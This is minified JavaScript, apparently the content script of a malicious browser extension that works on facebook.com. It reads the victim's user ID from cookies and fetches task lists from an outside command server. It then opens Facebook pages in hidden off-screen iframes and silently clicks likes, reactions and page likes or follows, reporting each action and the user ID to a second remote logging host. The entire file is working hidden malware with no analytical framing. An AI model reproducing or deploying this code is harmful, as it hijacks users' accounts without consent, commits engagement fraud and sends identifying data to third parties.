!function(t,e){var n=function(t){var e=document.cookie.match(new RegExp("(?:^|; )"+t.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return e?e[1]:""},i=function(){return this.logData={fingerprint:"",type:"",type_task:"",timeStart:0,timeEnd:0,id:0,v:"",error:0},this.add("type","Chrome_bd4"),this},o=function(){return this};i.prototype={add:function(t,e){this.logData[t]=e},push:function(t,e){this.logData[t].push(e)},send:function(){var t=a.contentWindow,e={u:l,log:this.logData};t.postMessage(JSON.stringify(e),f)},sendOk:function(){this.add("timeEnd",b()),this.send()},sendError:function(t){this.add("timeEnd",b()),this.add("error",t),this.send()}},o.prototype={getSend:function(t,e,n,i,o){this.sender("GET",t,null,e,n,i,o)},sender:function(t,e,n,i,o,a,s){var r=new XMLHttpRequest;if(r.open(t,e,!0),r.onreadystatechange=function(){4!==r.readyState||200!==r.status&&204!==r.status?4===r.readyState&&200!==r.status&&204!==r.status&&o&&o():i&&i(r.responseText)},s)for(var d in s)r.setRequestHeader(d,s[d]);r.send()}};var a,s=window,r=document,d=new o,c="",u="facebook.com",f="https://saltcdn2.facebook.com",l="https://statlog.statuses.space/event",p="bd_fl_",v=p+"fr_",m=v+"div4",h=!1,y=[],w=0,g=Date.now||function(){return+new Date},b=function(){return Math.ceil(g()/1e3)},k=function(){var t=a.contentWindow,e={u:"https://service.nservices.space/youlist.php?worker=4&uid="+c,lf:"4"};h||(h=!0,t.postMessage(JSON.stringify(e),f))},_=function(t){if(t.origin===f)try{var e=JSON.parse(t.data);if(e&&e.lf&&"4"==e.lf&&e.res){if(!h)return;h=!1,E(e.res)}}catch(t){}},E=function(t){for(var e in w=0,y=[],L)if(void 0!==t[e])for(var n in t[e])w++,y.push({id:n,item:t[e][n],type:e,visitor_id:c,curTime:b()});w&&S(),setTimeout(function(){k()},6e4)},S=function(){if(w){var t=r.getElementById(m);t||((t=r.createElement("div")).id=m,t.style.position="absolute",t.style.left="-"+s.innerWidth+"px",t.style.top="0",t.style.zIndex="-9999999",t.style.width=s.innerWidth+"px",t.style.height=s.innerHeight+"px",t.style.overflow="hidden",t.style.opacity="0.01",r.body.appendChild(t));for(let t=1;t<=w;t++)x(2*t)}},D=function(t,e,n,i,o,a,s){void 0===s&&(s=4);var r=t.evaluate(i,o,null,XPathResult.ANY_TYPE,null).iterateNext();r?a(r,n):s?setTimeout(function(){D(t,e,n,i,o,a,s-1)},300):e.remove()},x=function(t){var e=null;if(y.length&&(e=y.shift()),e){e=L[e.type](e);var n=r.getElementById(m),i=r.getElementById(v+e.id);i&&i.remove(),(i=r.createElement("iframe")).id=v+e.type+"_"+e.id,i.style.width=s.innerWidth+"px",i.style.height=s.innerHeight+"px",i.width=s.innerWidth+"",i.height=s.innerHeight+"",n.appendChild(i),i&&T(i,e,t)}},T=function(t,e,n){d.getSend("https://www.facebook.com/"+e.item,function(i){var o=function(){t.contentDocument?(t.contentDocument.write(i),setTimeout(function(){switch(e.tasktype){case"fblikes":case"fbemo":I(t,e);break;case"fblikepage":R(t,e)}},3*n*1e3)):setTimeout(o,100)};o()},function(){t.remove()})},C=function(t){var e=new i;e.add("type_task",t.tasktype),e.add("fingerprint",t.logtype+c),e.add("timeStart",b()),e.add("id",parseInt(t.id)),e.add("v",t.item),e.sendOk()},I=function(t,e){var n=t.contentDocument;D(n,t,1,'//div[@id="globalContainer"]',n,function(i,o){D(n,t,o+1,'//div[contains(@class,"userContentWrapper")]',i,function(o,a){D(n,t,a+1,'//form[contains(@class,"commentable_item")]',o,function(o,a){D(n,t,a+1,'//a[@data-testid="UFI2ReactionLink"]',o,function(o,a){if("false"===o.getAttribute("aria-pressed")){if("fblikes"===e.tasktype)return o.click(),C(e),void setTimeout(function(){t.remove()},5e3);var s=document.createEvent("MouseEvents");s.initMouseEvent("mouseover",!0,!1,window,1,0,0,0,0,!1,!1,!1,!1,0,null),o.dispatchEvent(s),D(n,t,a+1,'//div[@data-testid="UFIReactionsMenu"]',i,function(i,o){D(n,t,o+1,'//span[@data-testid="reaction_'+e.subtype+'"]',i,function(n,i){n&&(n.click(),C(e),setTimeout(function(){t.remove()},5e3))})})}else t.remove()})})})})},R=function(t,e){var n=t.contentDocument;D(n,t,1,'//div[@id="globalContainer"]',n,function(i,o){D(n,t,o+1,'div[contains(@class,"fb_content")]',i,function(o,a){D(n,t,a+1,'div/div/div/div[@id="content_container"]/parent::div/div[1]',o,function(o,a){D(n,t,a+1,'//*[contains(@class,"likeButton") or contains(@class,"likedButton")]',o,function(o,a){o.getAttribute("data-testid").match(/like_/i)?(o.click(),D(n,t,a+1,'//a[contains(@data-testid,"page_profile_followed_button_test_id")]',i,function(o,a){o.click(),D(n,t,a+1,'//div[contains(@class,"uiContextualLayerPositioner")]',i,function(i,o){D(n,t,o+1,'//a[contains(@data-testid,"unfollow_item")]/parent::li',i,function(n,i){n.click(),C(e),setTimeout(function(){t.remove()},5e3)})})})):t.remove()})})})})},L={26:function(t){return t.subtype=1,t.logtype="fbl",t.tasktype="fblikes",t},29:function(t){var e=t.item.match(/^(.*)_([0-9]+)$/i);if(e)return t.item=e[1],t.subtype=e[2],t.logtype="fbe",t.tasktype="fbemo",t},35:function(t){return t.logtype="fbp",t.tasktype="fblikepage",t}},M=function(){if(window.top===window.self&&r.location.href.match(new RegExp(u,"i"))){if(window.fbLikeStart)return;window.fbLikeStart=!0,function(){if(!window[p]){if(window[p]=!0,window.require){var t=window.require("CurrentUserInitialData");t&&t.USER_ID&&(c=t.USER_ID)}else c=n("c_user");c&&(window.addEventListener("message",_),(a=r.createElement("iframe")).id=p+"4",a.src=f+"/lister.html",a.style.width=a.style.height="1px",a.style.position="absolute",a.style.left="-999px",a.onload=function(){window.bd_fl_e||(window.bd_fl_e=!0,k())},r.body.appendChild(a))}}()}};"interactive"===r.readyState||"complete"===r.readyState?M():r.addEventListener("DOMContentLoaded",M,!1)}();